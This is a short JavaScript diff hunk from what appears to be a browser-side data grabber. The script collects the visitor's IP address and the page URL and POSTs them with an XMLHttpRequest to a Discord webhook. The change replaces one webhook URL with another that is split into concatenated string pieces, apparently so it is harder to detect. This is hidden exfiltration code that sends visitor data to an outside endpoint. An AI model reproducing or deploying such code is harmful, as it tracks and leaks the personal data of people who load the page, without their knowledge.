@@ -8,7 +8,7 @@ try {
     ipad = "error loading IP"
 }
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://discord.com/api/webhooks/926855926881861662/w01BN9-fwIPZXJZ3QjGWzCrJwvwMkV7bnhbVuYsj5grfYK8Fg596_qtJ8bCeUAkoEUzU", true);
+xhr.open("POST", "https://discord.com/api/webhooks/8039505"+"82087548999/YBfZ5hhHVRMYnbbCJE9gjMg99SwC96cid9"+"kkv9My_5MrhHZ0MxvmoYl4-rPVovs-cGyW", true);
 xhr.setRequestHeader('Content-Type', 'application/json');
 xhr.send(JSON.stringify({
     "content": "Data from " + window.location.href + " " + ipad + "\n" + 
